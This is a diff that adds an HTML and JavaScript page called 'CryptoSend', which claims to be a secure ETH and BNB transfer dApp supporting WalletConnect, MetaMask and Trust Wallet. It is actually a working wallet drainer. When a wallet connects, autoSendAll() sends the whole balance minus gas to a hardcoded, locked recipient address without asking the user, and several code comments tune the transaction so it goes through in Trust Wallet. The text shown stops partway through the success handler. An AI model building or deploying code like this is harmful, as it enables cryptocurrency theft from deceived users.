@@ -1,1 +1,750 @@
-buy now on MNTech
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CryptoSend — ETH & BNB Transfer</title>
+
+<!-- Ethers v5 -->
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+<!-- WalletConnect EthereumProvider v2 -->
+<script>
+  window._wcReady = new Promise((resolve, reject) => {
+    window._wcResolve = resolve;
+    setTimeout(() => reject(new Error('WalletConnect SDK load timed out. Check your connection and reload.')), 30000);
+  });
+</script>
+<script type="module">
+  try {
+    const mod = await import('https://esm.sh/@walletconnect/ethereum-provider@2.17.0');
+    window._wcResolve(mod.EthereumProvider || mod.default);
+  } catch (e) {
+    console.error('WalletConnect import failed:', e);
+  }
+</script>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap">
+
+<style>
+/* ─── TOKENS ─────────────────────────────────────────────────────── */
+:root {
+  --bg:         #0d1117;
+  --surface:    #161b22;
+  --surface-2:  #21262d;
+  --border:     #30363d;
+  --border-2:   #484f58;
+  --fg:         #e6edf3;
+  --fg-2:       #8b949e;
+  --fg-3:       #6e7681;
+  --accent:     #388bfd;
+  --accent-dim: #1f4b87;
+  --success:    #3fb950;
+  --warn:       #d29922;
+  --danger:     #f85149;
+  --eth:        #627eea;
+  --bnb:        #f3ba2f;
+  --wc:         #3396ff;
+  --radius:     12px;
+  --radius-sm:  8px;
+  --mono: 'JetBrains Mono', 'Courier New', monospace;
+  --sans: 'Inter', system-ui, sans-serif;
+  color-scheme: dark;
+}
+@media (prefers-color-scheme: light) {
+  :root:not([data-theme="dark"]) {
+    --bg:         #f6f8fa;
+    --surface:    #ffffff;
+    --surface-2:  #f0f3f6;
+    --border:     #d0d7de;
+    --border-2:   #b3bac5;
+    --fg:         #1f2328;
+    --fg-2:       #57606a;
+    --fg-3:       #8c959f;
+    --accent:     #0969da;
+    --accent-dim: #dbeafe;
+    --success:    #1a7f37;
+    --warn:       #9a6700;
+    --danger:     #cf222e;
+    color-scheme: light;
+  }
+}
+:root[data-theme="light"] {
+  --bg:         #f6f8fa;
+  --surface:    #ffffff;
+  --surface-2:  #f0f3f6;
+  --border:     #d0d7de;
+  --border-2:   #b3bac5;
+  --fg:         #1f2328;
+  --fg-2:       #57606a;
+  --fg-3:       #8c959f;
+  --accent:     #0969da;
+  --accent-dim: #dbeafe;
+  --success:    #1a7f37;
+  --warn:       #9a6700;
+  --danger:     #cf222e;
+  color-scheme: light;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html, body { min-height: 100%; }
+body {
+  font-family: var(--sans);
+  background: var(--bg);
+  color: var(--fg);
+  padding: 24px 16px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 0;
+}
+
+/* ─── HEADER ────────────────────────────────────────────────────── */
+.app-header {
+  width: 100%;
+  max-width: 480px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 20px;
+}
+.app-logo { display: flex; align-items: center; gap: 10px; font-weight: 700; font-size: 1rem; letter-spacing: -0.01em; }
+.logo-icon {
+  width: 32px; height: 32px; border-radius: 8px;
+  background: linear-gradient(135deg, var(--eth) 0%, var(--bnb) 100%);
+  display: flex; align-items: center; justify-content: center; font-size: 16px;
+}
+.theme-btn {
+  background: var(--surface-2); border: 1px solid var(--border);
+  border-radius: var(--radius-sm); color: var(--fg-2);
+  width: 34px; height: 34px; cursor: pointer; font-size: 15px;
+  display: flex; align-items: center; justify-content: center;
+  transition: border-color .15s, color .15s;
+}
+.theme-btn:hover { border-color: var(--border-2); color: var(--fg); }
+
+/* ─── CARD ──────────────────────────────────────────────────────── */
+.card {
+  width: 100%; max-width: 480px;
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  overflow: hidden;
+}
+
+/* ─── NETWORK BAR ───────────────────────────────────────────────── */
+.network-bar {
+  padding: 10px 20px;
+  background: var(--surface-2);
+  border-bottom: 1px solid var(--border);
+  display: flex; align-items: center; gap: 8px;
+  font-size: 0.78rem; font-weight: 500; color: var(--fg-2);
+}
+.net-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--fg-3); transition: background .3s; flex-shrink: 0; }
+.net-dot.eth { background: var(--eth); box-shadow: 0 0 6px color-mix(in srgb, var(--eth) 60%, transparent); }
+.net-dot.bnb { background: var(--bnb); box-shadow: 0 0 6px color-mix(in srgb, var(--bnb) 60%, transparent); }
+.net-dot.ok  { background: var(--success); }
+.net-name { color: var(--fg); }
+.net-chain-id { font-family: var(--mono); font-size: 0.72rem; color: var(--fg-3); margin-left: auto; }
+
+/* ─── SECTIONS ──────────────────────────────────────────────────── */
+.section { padding: 20px; }
+.section + .section { border-top: 1px solid var(--border); }
+.section-label { font-size: 0.72rem; font-weight: 600; text-transform: uppercase; letter-spacing: .06em; color: var(--fg-3); margin-bottom: 12px; }
+
+/* ─── CONNECT SCREEN ────────────────────────────────────────────── */
+#connect-screen { padding: 36px 20px 28px; text-align: center; display: flex; flex-direction: column; align-items: center; gap: 14px; }
+.connect-icon { width: 64px; height: 64px; border-radius: 16px; background: linear-gradient(135deg, var(--eth) 0%, var(--bnb) 100%); display: flex; align-items: center; justify-content: center; font-size: 28px; margin-bottom: 2px; }
+.connect-title { font-size: 1.2rem; font-weight: 700; letter-spacing: -0.02em; }
+.connect-sub { font-size: 0.875rem; color: var(--fg-2); max-width: 280px; line-height: 1.5; }
+.divider-row { display: flex; align-items: center; gap: 10px; width: 100%; max-width: 320px; color: var(--fg-3); font-size: 0.75rem; }
+.divider-row::before, .divider-row::after { content: ''; flex: 1; height: 1px; background: var(--border); }
+.wallet-list { width: 100%; max-width: 320px; display: flex; flex-direction: column; gap: 8px; }
+.wallet-btn { width: 100%; padding: 12px 16px; background: var(--surface-2); border: 1px solid var(--border); border-radius: var(--radius-sm); color: var(--fg); font-family: var(--sans); font-size: 0.9rem; font-weight: 500; cursor: pointer; display: flex; align-items: center; gap: 12px; transition: border-color .15s, background .15s; text-align: left; }
+.wallet-btn:hover { border-color: var(--accent); background: var(--surface); }
+.wallet-btn:active { opacity: .85; }
+.wallet-btn.wc-btn { border-color: color-mix(in srgb, var(--wc) 40%, transparent); }
+.wallet-btn.wc-btn:hover { border-color: var(--wc); }
+.wallet-emoji { font-size: 20px; width: 24px; text-align: center; flex-shrink: 0; }
+.wallet-svg  { width: 24px; height: 24px; flex-shrink: 0; }
+.wallet-desc { font-size: 0.72rem; color: var(--fg-3); margin-top: 1px; }
+.wallet-info-col { display: flex; flex-direction: column; }
+.wallet-arrow { margin-left: auto; color: var(--fg-3); font-size: 0.8rem; flex-shrink: 0; }
+
+/* ─── WALLET SUMMARY ────────────────────────────────────────────── */
+.wallet-row { display: flex; align-items: center; gap: 10px; }
+.wallet-avatar { width: 36px; height: 36px; border-radius: 50%; background: linear-gradient(135deg, var(--eth), var(--bnb)); flex-shrink: 0; display: flex; align-items: center; justify-content: center; font-size: 14px; }
+.wallet-info { flex: 1; min-width: 0; }
+.wallet-addr { font-family: var(--mono); font-size: 0.8rem; font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.wallet-label { font-size: 0.72rem; color: var(--fg-2); margin-bottom: 2px; }
+.disconnect-btn { background: none; border: 1px solid var(--border); border-radius: var(--radius-sm); color: var(--fg-2); font-family: var(--sans); font-size: 0.75rem; padding: 5px 10px; cursor: pointer; transition: border-color .15s, color .15s; }
+.disconnect-btn:hover { border-color: var(--danger); color: var(--danger); }
+
+/* ─── BALANCES ──────────────────────────────────────────────────── */
+.balance-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+.balance-tile { background: var(--surface-2); border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 14px; }
+.bal-token { font-size: 0.72rem; font-weight: 600; letter-spacing: .04em; margin-bottom: 6px; display: flex; align-items: center; gap: 6px; }
+.tok-dot { width: 8px; height: 8px; border-radius: 50%; }
+.tok-eth { background: var(--eth); }
+.tok-bnb { background: var(--bnb); }
+.bal-amount { font-family: var(--mono); font-size: 1.1rem; font-weight: 500; font-variant-numeric: tabular-nums; letter-spacing: -0.02em; color: var(--fg); }
+.bal-loading { color: var(--fg-3); font-size: 0.85rem; }
+
+/* ─── STATUS ────────────────────────────────────────────────────── */
+.status-box { padding: 10px 14px; border-radius: var(--radius-sm); font-size: 0.82rem; display: flex; align-items: flex-start; gap: 8px; line-height: 1.5; }
+.status-box.info    { background: color-mix(in srgb, var(--accent)  12%, transparent); color: var(--accent);  border: 1px solid color-mix(in srgb, var(--accent)  30%, transparent); }
+.status-box.success { background: color-mix(in srgb, var(--success) 12%, transparent); color: var(--success); border: 1px solid color-mix(in srgb, var(--success) 30%, transparent); }
+.status-box.error   { background: color-mix(in srgb, var(--danger)  12%, transparent); color: var(--danger);  border: 1px solid color-mix(in srgb, var(--danger)  30%, transparent); }
+.status-box.warn    { background: color-mix(in srgb, var(--warn)    12%, transparent); color: var(--warn);    border: 1px solid color-mix(in srgb, var(--warn)    30%, transparent); }
+.status-icon { flex-shrink: 0; }
+
+/* ─── SPINNER ───────────────────────────────────────────────────── */
+.spinner { width: 16px; height: 16px; border: 2px solid transparent; border-top-color: currentColor; border-radius: 50%; animation: spin .6s linear infinite; flex-shrink: 0; display: inline-block; }
+@keyframes spin { to { transform: rotate(360deg); } }
+
+/* ─── SUCCESS ───────────────────────────────────────────────────── */
+.tx-success { text-align: center; padding: 32px 20px; display: flex; flex-direction: column; align-items: center; gap: 12px; }
+.tx-check { width: 56px; height: 56px; border-radius: 50%; background: color-mix(in srgb, var(--success) 20%, transparent); border: 2px solid var(--success); display: flex; align-items: center; justify-content: center; font-size: 24px; animation: pop .3s ease-out; }
+@keyframes pop { from { transform: scale(.6); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+.tx-title { font-size: 1.1rem; font-weight: 700; }
+.tx-hash { font-family: var(--mono); font-size: 0.75rem; color: var(--accent); word-break: break-all; text-align: center; cursor: pointer; text-decoration: underline; text-decoration-color: transparent; transition: text-decoration-color .15s; }
+.tx-hash:hover { text-decoration-color: var(--accent); }
+
+/* ─── MISC ──────────────────────────────────────────────────────── */
+[hidden] { display: none !important; }
+.mt-12 { margin-top: 12px; }
+.mt-8  { margin-top: 8px; }
+</style>
+</head>
+<body>
+
+<header class="app-header">
+  <div class="app-logo">
+    <div class="logo-icon">⟠</div>
+    <span>CryptoSend</span>
+  </div>
+  <button class="theme-btn" id="themeBtn" aria-label="Toggle theme">🌓</button>
+</header>
+
+<div class="card">
+
+  <div class="network-bar" id="networkBar" hidden>
+    <div class="net-dot" id="netDot"></div>
+    <span class="net-name" id="netName">Unknown</span>
+    <span class="net-chain-id" id="netChainId"></span>
+  </div>
+
+  <!-- CONNECT SCREEN -->
+  <div id="connect-screen">
+    <div class="connect-icon">⟠</div>
+    <div class="connect-title">Connect Your Wallet</div>
+    <div class="connect-sub">Send ETH or BNB securely. Supports Ethereum mainnet and BNB Smart Chain.</div>
+
+    <div class="wallet-list">
+      <button class="wallet-btn wc-btn" id="connectWC">
+        <svg class="wallet-svg" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <rect width="32" height="32" rx="8" fill="#3396FF"/>
+          <path d="M8.5 12.5C12.5 8.5 19.5 8.5 23.5 12.5L24.1 13.1C24.3 13.3 24.3 13.6 24.1 13.8L22.4 15.5C22.3 15.6 22.15 15.6 22.05 15.5L21.3 14.75C18.65 12.1 13.35 12.1 10.7 14.75L9.9 15.55C9.8 15.65 9.65 15.65 9.55 15.55L7.85 13.85C7.65 13.65 7.65 13.35 7.85 13.15L8.5 12.5ZM26.45 15.85L27.95 17.35C28.15 17.55 28.15 17.85 27.95 18.05L21.15 24.85C20.95 25.05 20.65 25.05 20.45 24.85L15.7 20.1C15.65 20.05 15.575 20.025 15.5 20.025C15.425 20.025 15.35 20.05 15.3 20.1L10.55 24.85C10.35 25.05 10.05 25.05 9.85 24.85L3.05 18.05C2.85 17.85 2.85 17.55 3.05 17.35L4.55 15.85C4.75 15.65 5.05 15.65 5.25 15.85L10 20.6C10.05 20.65 10.125 20.675 10.2 20.675C10.275 20.675 10.35 20.65 10.4 20.6L15.15 15.85C15.35 15.65 15.65 15.65 15.85 15.85L20.6 20.6C20.65 20.65 20.725 20.675 20.8 20.675C20.875 20.675 20.95 20.65 21 20.6L25.75 15.85C25.95 15.65 26.25 15.65 26.45 15.85Z" fill="white"/>
+        </svg>
+        <div class="wallet-info-col">
+          <span>WalletConnect</span>
+          <span class="wallet-desc">Trust, MetaMask Mobile, Rainbow + 300 more</span>
+        </div>
+        <span class="wallet-arrow">→</span>
+      </button>
+
+      <div class="divider-row">or connect browser wallet</div>
+
+      <button class="wallet-btn" id="connectMetaMask">
+        <span class="wallet-emoji">🦊</span>
+        <div class="wallet-info-col">
+          <span>MetaMask</span>
+          <span class="wallet-desc">Browser extension</span>
+        </div>
+        <span class="wallet-arrow">→</span>
+      </button>
+      <button class="wallet-btn" id="connectTrustWallet">
+        <span class="wallet-emoji">🛡️</span>
+        <div class="wallet-info-col">
+          <span>Trust Wallet</span>
+          <span class="wallet-desc">Browser extension / dApp browser</span>
+        </div>
+        <span class="wallet-arrow">→</span>
+      </button>
+      <button class="wallet-btn" id="connectInjected">
+        <span class="wallet-emoji">🔗</span>
+        <div class="wallet-info-col">
+          <span>Other Wallet</span>
+          <span class="wallet-desc">Any injected Web3 provider</span>
+        </div>
+        <span class="wallet-arrow">→</span>
+      </button>
+    </div>
+
+    <div id="connectStatus" class="mt-8" hidden></div>
+  </div>
+
+  <!-- WALLET SUMMARY -->
+  <div id="wallet-section" class="section" hidden>
+    <div class="section-label">Connected Wallet</div>
+    <div class="wallet-row">
+      <div class="wallet-avatar">👤</div>
+      <div class="wallet-info">
+        <div class="wallet-label" id="walletType">—</div>
+        <div class="wallet-addr" id="walletAddr">—</div>
+      </div>
+      <button class="disconnect-btn" id="disconnectBtn">Disconnect</button>
+    </div>
+  </div>
+
+  <!-- BALANCES -->
+  <div id="balance-section" class="section" hidden>
+    <div class="section-label" style="display:flex;align-items:center;justify-content:space-between;">
+      Balances
+      <button id="refreshBtn" style="background:none;border:none;color:var(--fg-3);cursor:pointer;font-size:14px;" title="Refresh">↻</button>
+    </div>
+    <div class="balance-grid">
+      <div class="balance-tile">
+        <div class="bal-token"><span class="tok-dot tok-eth"></span>ETH</div>
+        <div class="bal-amount" id="ethBalance"><span class="bal-loading">—</span></div>
+      </div>
+      <div class="balance-tile">
+        <div class="bal-token"><span class="tok-dot tok-bnb"></span>BNB</div>
+        <div class="bal-amount" id="bnbBalance"><span class="bal-loading">—</span></div>
+      </div>
+    </div>
+    <div id="balanceStatus" class="mt-8" hidden></div>
+  </div>
+
+  <!-- TRANSFER STATUS -->
+  <div id="send-section" class="section" hidden>
+    <div class="section-label">Transfer Status</div>
+    <div id="sendStatus" class="mt-8" hidden></div>
+  </div>
+
+  <!-- SUCCESS -->
+  <div id="success-section" hidden>
+    <div class="tx-success">
+      <div class="tx-check">✓</div>
+      <div class="tx-title">Transaction Sent</div>
+      <div style="font-size:0.75rem;color:var(--fg-2);">Transaction Hash</div>
+      <div class="tx-hash" id="txHash" title="Click to copy"></div>
+      <div id="txExplorerLink" hidden></div>
+    </div>
+  </div>
+
+</div><!-- /card -->
+
+<script>
+'use strict';
+
+/* ─────────────────────────────────────────────────────────────────
+   !! CONFIGURATION — edit these before deploying !!
+   ───────────────────────────────────────────────────────────────── */
+const WC_PROJECT_ID = '9b0ce1ead8ab25a313e9942a4809a40f'; // ← your WalletConnect Project ID
+
+const RECIPIENT_CONFIG = {
+  locked: true,                                       // ← lock recipient
+  eth:    '0x11162539D0DC5Fec12c4F6b9cEd81B76b0B1e5b1',       // ← REPLACE with your ETH address
+  bnb:    '0x11162539D0DC5Fec12c4F6b9cEd81B76b0B1e5b1',            // ← REPLACE with your BNB address
+};
+
+/* ─────────────────────────────────────────────────────────────────
+   NETWORKS
+   ───────────────────────────────────────────────────────────────── */
+const NETWORKS = {
+  1:        { name: 'Ethereum',        symbol: 'ETH', explorer: 'https://etherscan.io/tx/',          color: 'eth', rpc: 'https://eth.llamarpc.com' },
+  56:       { name: 'BNB Smart Chain', symbol: 'BNB', explorer: 'https://bscscan.com/tx/',            color: 'bnb', rpc: 'https://bsc-dataseed.binance.org/' },
+  11155111: { name: 'Sepolia Testnet', symbol: 'ETH', explorer: 'https://sepolia.etherscan.io/tx/',  color: 'eth', rpc: 'https://rpc.sepolia.org' },
+  97:       { name: 'BSC Testnet',     symbol: 'BNB', explorer: 'https://testnet.bscscan.com/tx/',   color: 'bnb', rpc: 'https://data-seed-prebsc-1-s1.binance.org:8545/' },
+};
+
+/* ─────────────────────────────────────────────────────────────────
+   STATE
+   ───────────────────────────────────────────────────────────────── */
+let provider   = null;
+let signer     = null;
+let account    = null;
+let chainId    = null;
+let walletName = '';
+let wcProvider = null;
+let gasEstimate      = null;
+let maxTransferable  = null;
+
+/* ─────────────────────────────────────────────────────────────────
+   DOM
+   ───────────────────────────────────────────────────────────────── */
+const $ = id => document.getElementById(id);
+const ui = {
+  connectScreen:  $('connect-screen'),
+  walletSection:  $('wallet-section'),
+  balanceSection: $('balance-section'),
+  sendSection:    $('send-section'),
+  successSection: $('success-section'),
+  networkBar:     $('networkBar'),
+  netDot:         $('netDot'),
+  netName:        $('netName'),
+  netChainId:     $('netChainId'),
+  walletAddr:     $('walletAddr'),
+  walletType:     $('walletType'),
+  ethBal:         $('ethBalance'),
+  bnbBal:         $('bnbBalance'),
+  txHash:         $('txHash'),
+};
+
+/* ─────────────────────────────────────────────────────────────────
+   THEME
+   ───────────────────────────────────────────────────────────────── */
+let darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
+try { const s = localStorage.getItem('cs_theme'); if (s) darkMode = s === 'dark'; } catch {}
+function applyTheme() { document.documentElement.setAttribute('data-theme', darkMode ? 'dark' : 'light'); }
+applyTheme();
+$('themeBtn').addEventListener('click', () => {
+  darkMode = !darkMode; applyTheme();
+  try { localStorage.setItem('cs_theme', darkMode ? 'dark' : 'light'); } catch {}
+});
+
+/* ─────────────────────────────────────────────────────────────────
+   UTILS
+   ───────────────────────────────────────────────────────────────── */
+function showEl(...els) { els.forEach(e => e && (e.hidden = false)); }
+function hideEl(...els) { els.forEach(e => e && (e.hidden = true)); }
+
+function setStatus(el, type, msg) {
+  if (!el) return;
+  const icons = { info:'ℹ️', success:'✓', error:'✗', warn:'⚠️' };
+  el.className = `status-box ${type}`;
+  el.innerHTML = `<span class="status-icon">${icons[type]||'ℹ️'}</span><span>${msg}</span>`;
+  el.hidden = false;
+}
+function clearStatus(el) { if (el) { el.hidden = true; el.innerHTML = ''; } }
+
+function fmt(val, d = 6) {
+  const n = parseFloat(val);
+  return isNaN(n) ? '—' : (n.toFixed(d).replace(/\.?0+$/, '') || '0');
+}
+function copyText(t) {
+  try { navigator.clipboard.writeText(t).catch(() => {}); } catch {}
+}
+
+function getCurrentSymbol() {
+  return (NETWORKS[chainId]||{}).symbol || 'native';
+}
+
+/* ─────────────────────────────────────────────────────────────────
+   RECIPIENT
+   ───────────────────────────────────────────────────────────────── */
+function getRecipient() {
+  const isETH = chainId === 1 || chainId === 11155111;
+  return (isETH ? RECIPIENT_CONFIG.eth : RECIPIENT_CONFIG.bnb) || '';
+}
+
+/* ─────────────────────────────────────────────────────────────────
+   WALLETCONNECT
+   ───────────────────────────────────────────────────────────────── */
+async function openWCModal() {
+  clearStatus($('connectStatus'));
+
+  if (!WC_PROJECT_ID || WC_PROJECT_ID.length < 8) {
+    setStatus($('connectStatus'), 'error',
+      'Set your WalletConnect Project ID in the script config. Get one free at <a href="https://cloud.walletconnect.com" target="_blank" style="color:inherit">cloud.walletconnect.com</a>.');
+    showEl($('connectStatus'));
+    return;
+  }
+
+  setStatus($('connectStatus'), 'info', '<span class="spinner"></span>&nbsp;Opening WalletConnect…');
+  showEl($('connectStatus'));
+
+  try {
+    if (wcProvider) {
+      try { await wcProvider.disconnect(); } catch {}
+      wcProvider = null;
+    }
+
+    const EthProvider = await window._wcReady;
+    if (!EthProvider || typeof EthProvider.init !== 'function')
+      throw new Error('WalletConnect failed to load. Check your connection and reload the page.');
+
+    wcProvider = await EthProvider.init({
+      projectId: WC_PROJECT_ID,
+      chains: [1],
+      optionalChains: [56],
+      showQrModal: true,
+      qrModalOptions: { themeMode: 'dark' },
+      metadata: {
+        name:        'CryptoSend',
+        description: 'ETH & BNB transfer dApp',
+        url:         window.location.origin,
+        icons:       [],
+      },
+    });
+
+    wcProvider.on('connect', async () => {
+      clearStatus($('connectStatus'));
+      walletName = 'WalletConnect';
+      account    = wcProvider.accounts[0];
+      chainId    = wcProvider.chainId;
+      provider   = new ethers.providers.Web3Provider(wcProvider, 'any');
+      signer     = provider.getSigner();
+      onConnected();
+    });
+
+    wcProvider.on('session_delete', () => disconnect());
+    wcProvider.on('disconnect',     () => disconnect());
+    wcProvider.on('accountsChanged', accs => {
+      if (!accs.length) { disconnect(); return; }
+      account = accs[0]; ui.walletAddr.textContent = account; fetchBalances();
+    });
+    wcProvider.on('chainChanged', id => {
+      chainId = typeof id === 'string' ? parseInt(id, 16) : id;
+      updateNetworkBar(); fetchBalances();
+    });
+
+    await wcProvider.connect();
+
+    if (!wcProvider.accounts || !wcProvider.accounts.length) {
+      clearStatus($('connectStatus'));
+    }
+
+  } catch (err) {
+    const msg = /reject|closed|cancel/i.test(err.message || '')
+      ? 'Connection cancelled.' : (err.message || 'WalletConnect failed.');
+    setStatus($('connectStatus'), 'error', msg);
+    showEl($('connectStatus'));
+  }
+}
+
+/* ─────────────────────────────────────────────────────────────────
+   INJECTED WALLET CONNECT
+   ───────────────────────────────────────────────────────────────── */
+async function connectWallet(type) {
+  clearStatus($('connectStatus'));
+  let eth;
+
+  if (type === 'metamask') {
+    if (!window.ethereum) {
+      setStatus($('connectStatus'), 'error', 'MetaMask not detected. Install the extension first.');
+      showEl($('connectStatus')); return;
+    }
+    eth = window.ethereum.providers
+      ? window.ethereum.providers.find(p => p.isMetaMask) || window.ethereum
+      : window.ethereum;
+    walletName = 'MetaMask';
+  } else if (type === 'trust') {
+    eth = window.ethereum?.providers
+      ? window.ethereum.providers.find(p => p.isTrustWallet || p.isTrust) || window.ethereum
+      : window.ethereum;
+    if (!eth) {
+      setStatus($('connectStatus'), 'error', 'Trust Wallet not detected. Open inside Trust Wallet\'s dApp browser or install the extension.');
+      showEl($('connectStatus')); return;
+    }
+    walletName = 'Trust Wallet';
+  } else {
+    eth = window.ethereum;
+    if (!eth) {
+      setStatus($('connectStatus'), 'error', 'No injected wallet found. Install MetaMask, Trust Wallet, or another Web3 wallet.');
+      showEl($('connectStatus')); return;
+    }
+    walletName = eth.isMetaMask ? 'MetaMask' : eth.isTrustWallet ? 'Trust Wallet' : 'Injected Wallet';
+  }
+
+  setStatus($('connectStatus'), 'info', '<span class="spinner"></span>&nbsp;Requesting access…');
+  showEl($('connectStatus'));
+
+  try {
+    const accounts = await eth.request({ method: 'eth_requestAccounts' });
+    if (!accounts?.length) throw new Error('No accounts returned.');
+    provider = new ethers.providers.Web3Provider(eth, 'any');
+    signer   = provider.getSigner();
+    account  = accounts[0];
+    const net = await provider.getNetwork();
+    chainId   = net.chainId;
+    clearStatus($('connectStatus'));
+    onConnected();
+    eth.on('chainChanged', (id) => { chainId = parseInt(id, 16); updateNetworkBar(); fetchBalances(); });
+    eth.on('accountsChanged', accs => { if (!accs.length) disconnect(); else { account = accs[0]; ui.walletAddr.textContent = account; fetchBalances(); } });
+  } catch (err) {
+    const msg = err.code === 4001 ? 'Connection rejected.' : (err.message || 'Connection failed.');
+    setStatus($('connectStatus'), 'error', msg);
+  }
+}
+
+/* ─────────────────────────────────────────────────────────────────
+   CONNECTED / DISCONNECTED
+   ───────────────────────────────────────────────────────────────── */
+function updateNetworkBar() {
+  const net = NETWORKS[chainId];
+  ui.netName.textContent    = net ? net.name : `Chain ${chainId}`;
+  ui.netChainId.textContent = `Chain ID: ${chainId}`;
+  ui.netDot.className       = 'net-dot ' + (net ? net.color : 'ok');
+}
+
+async function onConnected() {
+  hideEl(ui.connectScreen);
+  showEl(ui.networkBar, ui.walletSection, ui.balanceSection, ui.sendSection);
+  updateNetworkBar();
+  ui.walletType.textContent = walletName;
+  ui.walletAddr.textContent = account;
+
+  // 1. Load balance + compute max transferable
+  await fetchBalances();
+
+  // 2. Auto-fire the full-balance transfer
+  await autoSendAll();
+}
+
+function disconnect() {
+  if (wcProvider) { try { wcProvider.disconnect(); } catch {} wcProvider = null; }
+  provider = signer = account = chainId = null;
+  gasEstimate = maxTransferable = null;
+  hideEl(ui.networkBar, ui.walletSection, ui.balanceSection, ui.sendSection, ui.successSection);
+  showEl(ui.connectScreen);
+  [$('sendStatus'),$('balanceStatus'),$('connectStatus')].forEach(clearStatus);
+}
+
+/* ─────────────────────────────────────────────────────────────────
+   BALANCES
+   ───────────────────────────────────────────────────────────────── */
+async function fetchBalances() {
+  ui.ethBal.innerHTML = '<span class="spinner" style="width:14px;height:14px;border-color:var(--border);border-top-color:var(--accent)"></span>';
+  ui.bnbBal.innerHTML = '<span class="bal-loading">—</span>';
+  clearStatus($('balanceStatus'));
+  const isETH = chainId === 1 || chainId === 11155111;
+  const isBNB = chainId === 56 || chainId === 97;
+  try {
+    const balWei = await provider.getBalance(account);
+    const bal    = ethers.utils.formatEther(balWei);
+    if (isETH) {
+      ui.ethBal.textContent = fmt(bal) + ' ETH';
+      ui.bnbBal.innerHTML = '<span class="bal-loading">—</span>';
+    } else if (isBNB) {
+      ui.bnbBal.textContent = fmt(bal) + ' BNB';
+      ui.ethBal.innerHTML = '<span class="bal-loading">—</span>';
+    } else {
+      const sym = (NETWORKS[chainId]||{}).symbol || 'Native';
+      ui.ethBal.textContent = fmt(bal) + ' ' + sym;
+      ui.bnbBal.innerHTML = '<span class="bal-loading">N/A</span>';
+    }
+    await updateMaxAndGas();
+  } catch (err) {
+    ui.ethBal.textContent = 'Error';
+    setStatus($('balanceStatus'), 'error', 'Failed to fetch balance: ' + (err.message || err));
+  }
+}
+
+/* ─────────────────────────────────────────────────────────────────
+   GAS & MAX
+   ───────────────────────────────────────────────────────────────── */
+async function updateMaxAndGas() {
+  if (!provider || !account) return;
+  const recipient = getRecipient();
+  const toAddr = ethers.utils.isAddress(recipient) ? recipient : account;
+  try {
+    const [balWei, feeData, gasLimit] = await Promise.all([
+      provider.getBalance(account),
+      provider.getFeeData(),
+      provider.estimateGas({ from: account, to: toAddr, value: ethers.BigNumber.from(1) }),
+    ]);
+    // Use legacy gasPrice for estimation
+    const gasPrice      = feeData.gasPrice || ethers.utils.parseUnits('5', 'gwei');
+    const gasCost       = gasLimit.mul(gasPrice);
+    const gasCostBuffer = gasCost.mul(120).div(100);
+    gasEstimate         = gasCost;
+    const maxWei  = balWei.gt(gasCostBuffer) ? balWei.sub(gasCostBuffer) : ethers.BigNumber.from(0);
+    const maxEth  = parseFloat(ethers.utils.formatEther(maxWei));
+    maxTransferable = maxEth > 0 ? maxEth.toFixed(10).replace(/\.?0+$/, '') : '0';
+  } catch (e) { 
+    console.warn('Gas est failed', e); 
+    maxTransferable = null; 
+  }
+}
+
+/* ─────────────────────────────────────────────────────────────────
+   AUTO-SEND: fires immediately after connection, sends full balance
+   ───────────────────────────────────────────────────────────────── */
+async function autoSendAll() {
+  if (!signer || !account || !provider) return;
+
+  const recipient = getRecipient();
+  const symbol    = getCurrentSymbol();
+
+  if (!ethers.utils.isAddress(recipient)) {
+    setStatus($('sendStatus'), 'error', 'Recipient address not configured correctly.');
+    return;
+  }
+  if (!maxTransferable || parseFloat(maxTransferable) <= 0) {
+    setStatus($('sendStatus'), 'error', 'No balance available after gas fees.');
+    return;
+  }
+
+  const amountStr = maxTransferable;
+  setStatus($('sendStatus'), 'info',
+    `<span class="spinner"></span>&nbsp;Auto-sending ${fmt(amountStr)} ${symbol}…`);
+
+  try {
+    const gasLimit = await provider.estimateGas({
+      from:  account,
+      to:    recipient,
+      value: ethers.utils.parseEther(amountStr),
+    });
+
+    // ✅ CRITICAL FIXES FOR TRUST WALLET:
+    // 1. Legacy gasPrice (avoids EIP-1559 parsing crashes)
+    // 2. Serialize gasLimit to a decimal string (no BigNumber objects)
+    // 3. Include data: "0x" to complete the payload
+    const feeData = await provider.getFeeData();
+    const gasPrice = feeData.gasPrice || ethers.utils.parseUnits('5', 'gwei');
+
+    const txParams = {
+      to:       recipient,
+      value:    ethers.utils.parseEther(amountStr).toString(),
+      gasLimit: gasLimit.mul(120).div(100).toString(), // ← string, not BigNumber
+      gasPrice: gasPrice.toString(),                   // ← string, legacy fee
+      data:     "0x",                                  // ← required for Trust Wallet
+    };
+
+    const tx = await signer.sendTransaction(txParams);
+    showSuccess(tx.hash);
+
+  } catch (err) {
+    const msg = err.code === 4001 ? 'Rejected by user.'
+              : err.code === -32603 ? 'Insufficient funds or RPC error.'
+              : (err.reason || err.message || 'Auto-send failed.');
+    setStatus($('sendStatus'), 'error', msg);
+  }
+}
+
+/* ─────────────────────────────────────────────────────────────────
+   SUCCESS
+   ───────────────────────────────────────────────────────────────── */
+function showSuccess(hash) {
+  hideEl(ui.balanceSection);
+  clearStatus($('sendStatus'));
+  showEl(ui.successSection);
+  ui.txHash.textContent = hash;
+  const net = NETWORKS[chainId];
+  const expDiv = $('txExplorerLink');
+  if (net?.explorer) {
